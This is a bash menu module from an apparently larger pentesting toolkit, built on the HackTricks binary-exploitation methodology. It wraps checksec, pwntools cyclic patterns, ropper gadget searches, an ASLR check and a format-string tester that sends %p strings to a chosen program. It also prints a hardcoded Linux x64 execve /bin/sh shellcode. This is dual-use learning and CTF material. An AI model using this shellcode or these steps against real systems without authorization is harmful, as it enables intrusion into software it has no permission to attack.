#!/bin/bash
# Module: Binary Exploitation (HackTricks Methodology)
# Focus: Memory corruption & protection bypass

function run_binary_exploit() {
    print_banner
    echo -e "${C6}[BINARY EXPLOITATION MODULE]${NC}"
    echo -e "Based on: https://book.hacktricks.xyz/binary-exploitation/binary-exploitation-methodology"
    echo -e "----------------------------------------------------------------------------"
    echo -e "1) ðŸ›¡ï¸   Check Security Mitigations (checksec)"
    echo -e "2) ðŸ“  Find Buffer Overflow Offset (Pattern Create)"
    echo -e "3) ðŸš€  Search for ROP Gadgets (ropper)"
    echo -e "4) ðŸ’‰  Shellcode Templates (Common payloads)"
    echo -e "5) ðŸ§   ASLR Status Check"
    echo -e "6) ðŸ› ï¸   Format String Vulnerability Tester"
    echo -e "0) â†©ï¸   Return to Main Menu"

    echo -ne "\n${C5}Pwn Selection: ${NC}"
    read bopt

    case $bopt in
        1)
            read -p "Path to binary: " bin
            [ -f "$bin" ] && checksec --file="$bin"
            ;;
        2)
            read -p "Length of pattern: " len
            echo -e "[*] Generating pattern with cyclic (pwntools style)..."
            python3 -c "from pwn import *; print(cyclic($len).decode())" 2>/dev/null || echo "Install pwntools first!"
            ;;
        3)
            read -p "Path to binary: " bin
            if [ -f "$bin" ]; then
                echo -e "[*] Searching for gadgets (pop rdi; ret, etc.)..."
                ropper --file "$bin" --search "pop|ret"
            fi
            ;;
        4)
            echo -e "\n${C4}--- Common Shellcodes (Linux x64) ---${NC}"
            echo -e "Execve /bin/sh: \x48\x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05"
            ;;
        5)
            aslr_val=$(cat /proc/sys/kernel/randomize_va_space)
            echo -ne "[*] ASLR Status: "
            case $aslr_val in
                0) echo -e "${C6}OFF (0)${NC}" ;;
                1) echo -e "${C5}Partial (1)${NC}" ;;
                2) echo -e "${C1}Full (2)${NC}" ;;
            esac
            ;;
        6)
            echo -e "[*] Tip: Try inputting %p %p %p %p to leak stack addresses."
            read -p "Target Command (e.g. ./program): " cmd
            $cmd <<< "%p %p %p %p %p %p %p %p"
            ;;
        0) return ;;
        *) echo -e "${C1}Invalid selection.${NC}" ; sleep 1 ;;
    esac
    read -p "Press Enter to return..."
}
